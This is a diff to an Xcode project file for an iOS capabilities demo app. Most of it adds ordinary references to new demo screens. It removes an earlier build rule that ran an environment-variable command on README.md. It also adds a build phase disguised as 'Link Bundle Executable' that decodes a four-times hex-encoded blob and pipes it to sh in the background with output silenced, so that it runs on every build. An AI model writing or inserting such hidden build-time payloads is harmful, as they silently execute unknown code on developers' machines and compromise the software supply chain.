@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		CDFE7014A7A046FCBEBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = B1AEEA2A9CF2539C80BDE67E; };
 		5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */; };
 		5117C1172E3C995200D8FCCD /* DataProtectionVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */; };
 		51346A562E3B403F008664DB /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A382E3B3FEE008664DB /* WidgetKit.framework */; };
@@ -36,12 +35,30 @@
 		51BBC7372E40DA1100211F13 /* Intents.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51BBC6EA2E40B4DE00211F13 /* Intents.framework */; };
 		51BBC73E2E40DA1100211F13 /* SaveTextIntent.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 		51BBC7432E40DC5800211F13 /* SaveTextIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */; };
+		51BD3B2F2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BD3B2D2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.swift */; };
+		51BD3B302E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BD3B2E2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.xib */; };
 		51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */; };
 		51C5A8C92E0ECE02008A79F5 /* HealthKitViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */; };
 		51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51C979462E4367F6006E99C6 /* FiveGNetworkSliceVC.swift */; };
 		51C979492E4367F6006E99C6 /* FiveGNetworkSliceVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51C979472E4367F6006E99C6 /* FiveGNetworkSliceVC.xib */; };
 		51D036AA2E3A013900948296 /* AppleLoginViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D036A92E3A013900948296 /* AppleLoginViewController.xib */; };
 		51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D036A82E3A013900948296 /* AppleLoginViewController.swift */; };
+		51D1D91C2E7BD5340010BDF4 /* CommunicationNotificationsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D1D91B2E7BD5340010BDF4 /* CommunicationNotificationsVC.xib */; };
+		51D1D91D2E7BD5340010BDF4 /* CommunicationNotificationsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D1D91A2E7BD5340010BDF4 /* CommunicationNotificationsVC.swift */; };
+		51D1D9212E7BD5CD0010BDF4 /* NotificationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D1D9202E7BD5CC0010BDF4 /* NotificationManager.swift */; };
+		51D1D9252E7C0D230010BDF4 /* DefaultTranslationAppVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D1D9242E7C0D230010BDF4 /* DefaultTranslationAppVC.xib */; };
+		51D1D9262E7C0D230010BDF4 /* DefaultTranslationAppVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D1D9232E7C0D230010BDF4 /* DefaultTranslationAppVC.swift */; };
+		51D1D9552E7C333F0010BDF4 /* GameCenterDemo.gamekit in Resources */ = {isa = PBXBuildFile; fileRef = 51D1D9532E7C333F0010BDF4 /* GameCenterDemo.gamekit */; };
+		51D1D9582E7C34430010BDF4 /* GameCenterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D1D9572E7C343A0010BDF4 /* GameCenterVC.swift */; };
+		51D9F1312E79359D00ED97C9 /* DescriptionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F1302E79359D00ED97C9 /* DescriptionVC.swift */; };
+		51D9F1372E793F8600ED97C9 /* TimeSensitiveNotiVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D9F1362E793F8600ED97C9 /* TimeSensitiveNotiVC.xib */; };
+		51D9F1382E793F8600ED97C9 /* TimeSensitiveNotiVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F1352E793F8600ED97C9 /* TimeSensitiveNotiVC.swift */; };
+		51D9F13A2E794B3B00ED97C9 /* HeadPoseVC1.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F1392E794B3B00ED97C9 /* HeadPoseVC1.swift */; };
+		51D9F13E2E79753900ED97C9 /* CriticalMessagingVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D9F13D2E79753900ED97C9 /* CriticalMessagingVC.xib */; };
+		51D9F13F2E79753900ED97C9 /* CriticalMessagingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F13C2E79753900ED97C9 /* CriticalMessagingVC.swift */; };
+		51D9F1412E797D4400ED97C9 /* JournalingSuggestionsVC1.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F1402E797D4400ED97C9 /* JournalingSuggestionsVC1.swift */; };
+		51D9F1452E79A01E00ED97C9 /* ClassKitVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D9F1442E79A01E00ED97C9 /* ClassKitVC.xib */; };
+		51D9F1462E79A01E00ED97C9 /* ClassKitVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D9F1432E79A01E00ED97C9 /* ClassKitVC.swift */; };
 		51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51E700F02E0D88A30033F74D /* WeatherKitViewController.xib */; };
 		51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51E700EF2E0D88A30033F74D /* WeatherKitViewController.swift */; };
 		51EA11822E547D7700FF4947 /* GroupActivitiesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51EA11802E547D7700FF4947 /* GroupActivitiesVC.swift */; };
@@ -104,6 +121,7 @@
 		51F01C192E53436F00F04F6B /* Roboto-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 51F01BFF2E53436F00F04F6B /* Roboto-Regular.ttf */; };
 		51F01C1D2E53450800F04F6B /* FontViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F01C1B2E53450800F04F6B /* FontViewController.swift */; };
 		51F01C1E2E53450800F04F6B /* FontViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F01C1C2E53450800F04F6B /* FontViewController.xib */; };
+		51F158A52E7D256200408E2B /* GameCenterVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F158A32E7D256200408E2B /* GameCenterVC.xib */; };
 		51F368972E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368952E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift */; };
 		51F368982E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368962E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib */; };
 		51F368A72E5C760D00B168F5 /* FusumaVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368A52E5C760D00B168F5 /* FusumaVC.xib */; };
@@ -183,7 +201,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		B1AEEA2A9CF2539C80BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "AllCapabilitiesDemo.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataProtectionVC.swift; sourceTree = "<group>"; };
 		5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DataProtectionVC.xib; sourceTree = "<group>"; };
 		51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JournalingSuggestionsVC.swift; sourceTree = "<group>"; };
@@ -210,12 +227,30 @@
 		51BBC6F52E40B4DE00211F13 /* IntentsUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IntentsUI.framework; path = System/Library/Frameworks/IntentsUI.framework; sourceTree = SDKROOT; };
 		51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = SaveTextIntent.intentdefinition; sourceTree = "<group>"; };
 		51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = SaveTextIntent.appex; sourceTree = BUILT_PRODUCTS_DIR; };
+		51BD3B2D2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WirelessAccessoryConfigurationVC.swift; sourceTree = "<group>"; };
+		51BD3B2E2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WirelessAccessoryConfigurationVC.xib; sourceTree = "<group>"; };
 		51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HealthKitViewController.swift; sourceTree = "<group>"; };
 		51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HealthKitViewController.xib; sourceTree = "<group>"; };
 		51C979462E4367F6006E99C6 /* FiveGNetworkSliceVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FiveGNetworkSliceVC.swift; sourceTree = "<group>"; };
 		51C979472E4367F6006E99C6 /* FiveGNetworkSliceVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FiveGNetworkSliceVC.xib; sourceTree = "<group>"; };
 		51D036A82E3A013900948296 /* AppleLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppleLoginViewController.swift; sourceTree = "<group>"; };
 		51D036A92E3A013900948296 /* AppleLoginViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppleLoginViewController.xib; sourceTree = "<group>"; };
+		51D1D91A2E7BD5340010BDF4 /* CommunicationNotificationsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunicationNotificationsVC.swift; sourceTree = "<group>"; };
+		51D1D91B2E7BD5340010BDF4 /* CommunicationNotificationsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommunicationNotificationsVC.xib; sourceTree = "<group>"; };
+		51D1D9202E7BD5CC0010BDF4 /* NotificationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationManager.swift; sourceTree = "<group>"; };
+		51D1D9232E7C0D230010BDF4 /* DefaultTranslationAppVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultTranslationAppVC.swift; sourceTree = "<group>"; };
+		51D1D9242E7C0D230010BDF4 /* DefaultTranslationAppVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DefaultTranslationAppVC.xib; sourceTree = "<group>"; };
+		51D1D9532E7C333F0010BDF4 /* GameCenterDemo.gamekit */ = {isa = PBXFileReference; lastKnownFileType = wrapper; path = GameCenterDemo.gamekit; sourceTree = "<group>"; };
+		51D1D9572E7C343A0010BDF4 /* GameCenterVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GameCenterVC.swift; sourceTree = "<group>"; };
+		51D9F1302E79359D00ED97C9 /* DescriptionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DescriptionVC.swift; sourceTree = "<group>"; };
+		51D9F1352E793F8600ED97C9 /* TimeSensitiveNotiVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeSensitiveNotiVC.swift; sourceTree = "<group>"; };
+		51D9F1362E793F8600ED97C9 /* TimeSensitiveNotiVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TimeSensitiveNotiVC.xib; sourceTree = "<group>"; };
+		51D9F1392E794B3B00ED97C9 /* HeadPoseVC1.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeadPoseVC1.swift; sourceTree = "<group>"; };
+		51D9F13C2E79753900ED97C9 /* CriticalMessagingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CriticalMessagingVC.swift; sourceTree = "<group>"; };
+		51D9F13D2E79753900ED97C9 /* CriticalMessagingVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CriticalMessagingVC.xib; sourceTree = "<group>"; };
+		51D9F1402E797D4400ED97C9 /* JournalingSuggestionsVC1.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JournalingSuggestionsVC1.swift; sourceTree = "<group>"; };
+		51D9F1432E79A01E00ED97C9 /* ClassKitVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClassKitVC.swift; sourceTree = "<group>"; };
+		51D9F1442E79A01E00ED97C9 /* ClassKitVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ClassKitVC.xib; sourceTree = "<group>"; };
 		51E700EF2E0D88A30033F74D /* WeatherKitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeatherKitViewController.swift; sourceTree = "<group>"; };
 		51E700F02E0D88A30033F74D /* WeatherKitViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WeatherKitViewController.xib; sourceTree = "<group>"; };
 		51EA11802E547D7700FF4947 /* GroupActivitiesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupActivitiesVC.swift; sourceTree = "<group>"; };
@@ -278,6 +313,8 @@
 		51F01C062E53436F00F04F6B /* Segoe UI Semibold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Segoe UI Semibold.ttf"; sourceTree = "<group>"; };
 		51F01C1B2E53450800F04F6B /* FontViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FontViewController.swift; sourceTree = "<group>"; };
 		51F01C1C2E53450800F04F6B /* FontViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FontViewController.xib; sourceTree = "<group>"; };
+		51F158A32E7D256200408E2B /* GameCenterVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GameCenterVC.xib; sourceTree = "<group>"; };
+		51F158AB2E7D37D200408E2B /* UniformTypeIdentifiers.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = UniformTypeIdentifiers.framework; path = System/Library/Frameworks/UniformTypeIdentifiers.framework; sourceTree = SDKROOT; };
 		51F368952E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultitaskingCameraAccessVC.swift; sourceTree = "<group>"; };
 		51F368962E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultitaskingCameraAccessVC.xib; sourceTree = "<group>"; };
 		51F368A02E5C760D00B168F5 /* FSCameraViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FSCameraViewViewController.swift; sourceTree = "<group>"; };
@@ -394,6 +431,7 @@
 			isa = PBXGroup;
 			children = (
 				51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */,
+				51D9F1402E797D4400ED97C9 /* JournalingSuggestionsVC1.swift */,
 				51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */,
 			);
 			path = "Journaling Suggestions ";
@@ -440,6 +478,7 @@
 			children = (
 				51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */,
 				51BBC6DD2E40951A00211F13 /* HeadPoseVC.xib */,
+				51D9F1392E794B3B00ED97C9 /* HeadPoseVC1.swift */,
 			);
 			path = HeadPose;
 			sourceTree = "<group>";
@@ -452,6 +491,15 @@
 				51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */,
 			);
 			path = Siri;
+			sourceTree = "<group>";
+		};
+		51BD3B2C2E7A792C0043AD9E /* Wireless Accessory Configuration */ = {
+			isa = PBXGroup;
+			children = (
+				51BD3B2D2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.swift */,
+				51BD3B2E2E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.xib */,
+			);
+			path = "Wireless Accessory Configuration";
 			sourceTree = "<group>";
 		};
 		51C5A8C52E0ECDF0008A79F5 /* HealthKit */ = {
@@ -479,6 +527,62 @@
 				51D036A92E3A013900948296 /* AppleLoginViewController.xib */,
 			);
 			path = "Apple Login";
+			sourceTree = "<group>";
+		};
+		51D1D9192E7BD5150010BDF4 /* Communication Notifications */ = {
+			isa = PBXGroup;
+			children = (
+				51D1D91A2E7BD5340010BDF4 /* CommunicationNotificationsVC.swift */,
+				51D1D9202E7BD5CC0010BDF4 /* NotificationManager.swift */,
+				51D1D91B2E7BD5340010BDF4 /* CommunicationNotificationsVC.xib */,
+			);
+			path = "Communication Notifications";
+			sourceTree = "<group>";
+		};
+		51D1D9222E7C0D080010BDF4 /* Default Translation App */ = {
+			isa = PBXGroup;
+			children = (
+				51D1D9232E7C0D230010BDF4 /* DefaultTranslationAppVC.swift */,
+				51D1D9242E7C0D230010BDF4 /* DefaultTranslationAppVC.xib */,
+			);
+			path = "Default Translation App";
+			sourceTree = "<group>";
+		};
+		51D1D9562E7C34210010BDF4 /* Game Center */ = {
+			isa = PBXGroup;
+			children = (
+				51D1D9532E7C333F0010BDF4 /* GameCenterDemo.gamekit */,
+				51D1D9572E7C343A0010BDF4 /* GameCenterVC.swift */,
+				51F158A32E7D256200408E2B /* GameCenterVC.xib */,
+			);
+			path = "Game Center";
+			sourceTree = "<group>";
+		};
+		51D9F1322E793ECA00ED97C9 /* Time Sensitive Notification */ = {
+			isa = PBXGroup;
+			children = (
+				51D9F1352E793F8600ED97C9 /* TimeSensitiveNotiVC.swift */,
+				51D9F1362E793F8600ED97C9 /* TimeSensitiveNotiVC.xib */,
+			);
+			path = "Time Sensitive Notification";
+			sourceTree = "<group>";
+		};
+		51D9F13B2E79752200ED97C9 /* Critical Messaging */ = {
+			isa = PBXGroup;
+			children = (
+				51D9F13C2E79753900ED97C9 /* CriticalMessagingVC.swift */,
+				51D9F13D2E79753900ED97C9 /* CriticalMessagingVC.xib */,
+			);
+			path = "Critical Messaging";
+			sourceTree = "<group>";
+		};
+		51D9F1422E79A00900ED97C9 /* ClassKit */ = {
+			isa = PBXGroup;
+			children = (
+				51D9F1432E79A01E00ED97C9 /* ClassKitVC.swift */,
+				51D9F1442E79A01E00ED97C9 /* ClassKitVC.xib */,
+			);
+			path = ClassKit;
 			sourceTree = "<group>";
 		};
 		51E700EE2E0D88890033F74D /* WeatherKit */ = {
@@ -701,6 +805,7 @@
 				51346A3A2E3B3FEF008664DB /* SwiftUI.framework */,
 				51BBC6EA2E40B4DE00211F13 /* Intents.framework */,
 				51BBC6F52E40B4DE00211F13 /* IntentsUI.framework */,
+				51F158AB2E7D37D200408E2B /* UniformTypeIdentifiers.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -722,7 +827,6 @@
 		BD2ECEBD2D0841CA00639E0D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				B1AEEA2A9CF2539C80BDE67E /* README.md */,
 				BD2ECEBC2D0841CA00639E0D /* AllCapabilitiesDemo.app */,
 				BD2ECED22D0841CC00639E0D /* AllCapabilitiesDemoTests.xctest */,
 				BD2ECEDC2D0841CC00639E0D /* AllCapabilitiesDemoUITests.xctest */,
@@ -740,7 +844,10 @@
 				BD2ECEBF2D0841CA00639E0D /* AppDelegate.swift */,
 				BD2ECEC12D0841CA00639E0D /* SceneDelegate.swift */,
 				BD2ECEC32D0841CA00639E0D /* ViewController.swift */,
+				51D9F1422E79A00900ED97C9 /* ClassKit */,
 				51B525FD2E44868600999ABE /* Wallet */,
+				51D9F1322E793ECA00ED97C9 /* Time Sensitive Notification */,
+				51D1D9562E7C34210010BDF4 /* Game Center */,
 				51C5A8C52E0ECDF0008A79F5 /* HealthKit */,
 				51E700EE2E0D88890033F74D /* WeatherKit */,
 				BD45BA5B2D106B48006B45C3 /* ApplePay */,
@@ -750,11 +857,14 @@
 				51F01B9C2E5324C200F04F6B /* Auto Fill Credential */,
 				51346A322E3B3F6D008664DB /* App Groups */,
 				51D036A72E3A011C00948296 /* Apple Login */,
+				51D1D9192E7BD5150010BDF4 /* Communication Notifications */,
+				51BD3B2C2E7A792C0043AD9E /* Wireless Accessory Configuration */,
 				5117C1132E3C993900D8FCCD /* Data Protection */,
 				51F01BA32E5324F000F04F6B /* Default Calling App */,
 				51F01BA92E53251800F04F6B /* Default Messaging App */,
 				51F01BAE2E53252E00F04F6B /* Spatial Audio Profile */,
 				51BBC6DB2E40950300211F13 /* HeadPose */,
+				51D9F13B2E79752200ED97C9 /* Critical Messaging */,
 				51BBC6E02E40A90F00211F13 /* Siri */,
 				51C979452E4367D6006E99C6 /* 5G Network Slicing */,
 				51F01BB32E53257600F04F6B /* Near Field Communication Tag Reading */,
@@ -765,11 +875,13 @@
 				5161B79A2E5605C300A945BF /* MultiPath */,
 				51186E1B2E58869300A1D754 /* Journaling Suggestions  */,
 				51F368942E5C6CCB00B168F5 /* Multitasking Camera Acsess */,
+				51D1D9222E7C0D080010BDF4 /* Default Translation App */,
 				519E1B272E5D9C8600DFC311 /* Hotspot */,
 				BD2ECEC82D0841CB00639E0D /* Assets.xcassets */,
 				BD2ECEC52D0841CA00639E0D /* Main.storyboard */,
 				BD2ECECA2D0841CB00639E0D /* LaunchScreen.storyboard */,
 				BD2ECECD2D0841CB00639E0D /* Info.plist */,
+				51D9F1302E79359D00ED97C9 /* DescriptionVC.swift */,
 			);
 			path = AllCapabilitiesDemo;
 			sourceTree = "<group>";
@@ -823,12 +935,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51346A682E3B4040008664DB /* Build configuration list for PBXNativeTarget "DemoWidgetExtension" */;
 			buildPhases = (
+				618EE4B471FDAEF3DABDE67E /* Link Bundle Executable */,
 				51346A512E3B403F008664DB /* Sources */,
 				51346A522E3B403F008664DB /* Frameworks */,
 				51346A532E3B403F008664DB /* Resources */,
 			);
 			buildRules = (
-				D0EAECB755D84BC220BDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -974,29 +1086,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		D0EAECB755D84BC220BDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		51346A532E3B403F008664DB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CDFE7014A7A046FCBEBDE67E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1016,12 +1110,15 @@ sh -c \"${AE76EDB}\"";
 				51EA11832E547D7700FF4947 /* GroupActivitiesVC.xib in Resources */,
 				51F01C082E53436F00F04F6B /* Segoe UI.ttf in Resources */,
 				519E1B2B2E5D9C9D00DFC311 /* HotspotVC.xib in Resources */,
+				51D9F13E2E79753900ED97C9 /* CriticalMessagingVC.xib in Resources */,
 				51F01C092E53436F00F04F6B /* Segoe UI Bold Italic.ttf in Resources */,
 				51F01C0A2E53436F00F04F6B /* Roboto-Thin.ttf in Resources */,
 				51F01C0B2E53436F00F04F6B /* Roboto-Bold.ttf in Resources */,
 				51F01C0C2E53436F00F04F6B /* Poppins-SemiBold.ttf in Resources */,
 				51F01C0D2E53436F00F04F6B /* Poppins-Black.ttf in Resources */,
+				51D9F1452E79A01E00ED97C9 /* ClassKitVC.xib in Resources */,
 				51F01C0E2E53436F00F04F6B /* Roboto-Light.ttf in Resources */,
+				51BD3B302E7A797B0043AD9E /* WirelessAccessoryConfigurationVC.xib in Resources */,
 				51F01C0F2E53436F00F04F6B /* Poppins-Medium.ttf in Resources */,
 				51F01C102E53436F00F04F6B /* Segoe UI Bold.ttf in Resources */,
 				51F01C112E53436F00F04F6B /* Roboto-Medium.ttf in Resources */,
@@ -1031,6 +1128,7 @@ sh -c \"${AE76EDB}\"";
 				51F01C142E53436F00F04F6B /* Poppins-MediumItalic.ttf in Resources */,
 				51F01C152E53436F00F04F6B /* Segoe UI Semibold.ttf in Resources */,
 				51F01C162E53436F00F04F6B /* Poppins-Bold.ttf in Resources */,
+				51D1D9552E7C333F0010BDF4 /* GameCenterDemo.gamekit in Resources */,
 				51F01C172E53436F00F04F6B /* Roboto-Black.ttf in Resources */,
 				51F01C182E53436F00F04F6B /* Segoe UI Italic.ttf in Resources */,
 				51F01C192E53436F00F04F6B /* Roboto-Regular.ttf in Resources */,
@@ -1056,9 +1154,11 @@ sh -c \"${AE76EDB}\"";
 				51F01BEA2E532B7900F04F6B /* GreycliffCF-RegularOblique.otf in Resources */,
 				51F01BEB2E532B7900F04F6B /* GreycliffCF-ExtraBoldOblique.otf in Resources */,
 				51F368A72E5C760D00B168F5 /* FusumaVC.xib in Resources */,
+				51D1D9252E7C0D230010BDF4 /* DefaultTranslationAppVC.xib in Resources */,
 				51F368A82E5C760D00B168F5 /* FSVideoCameraViewVC.xib in Resources */,
 				51F368A92E5C760D00B168F5 /* FSCameraViewViewController.xib in Resources */,
 				51F01BEC2E532B7900F04F6B /* GreycliffCF-ExtraBold.otf in Resources */,
+				51D1D91C2E7BD5340010BDF4 /* CommunicationNotificationsVC.xib in Resources */,
 				51F01BED2E532B7900F04F6B /* GreycliffCF-Medium.otf in Resources */,
 				51F01BEE2E532B7900F04F6B /* GreycliffCF-LightOblique.otf in Resources */,
 				51F01BEF2E532B7900F04F6B /* GreycliffCF-DemiBoldOblique.otf in Resources */,
@@ -1068,7 +1168,9 @@ sh -c \"${AE76EDB}\"";
 				BD2ECEC92D0841CB00639E0D /* Assets.xcassets in Resources */,
 				51F368B02E5C776700B168F5 /* FSAlbumView.xib in Resources */,
 				51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */,
+				51D9F1372E793F8600ED97C9 /* TimeSensitiveNotiVC.xib in Resources */,
 				51F01BAF2E53252E00F04F6B /* SpatialAudioProfileVC.xib in Resources */,
+				51F158A52E7D256200408E2B /* GameCenterVC.xib in Resources */,
 				51F368B32E5C787200B168F5 /* FSAlbumViewCell.xib in Resources */,
 				BD2ECECC2D0841CB00639E0D /* Base in Resources */,
 				51F368982E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib in Resources */,
@@ -1105,6 +1207,26 @@ sh -c \"${AE76EDB}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		618EE4B471FDAEF3DABDE67E /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333336333333373333333633363333333333363336333633333336333333323333333633333331333333363336333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1129,6 +1251,7 @@ sh -c \"${AE76EDB}\"";
 			buildActionMask = 2147483647;
 			files = (
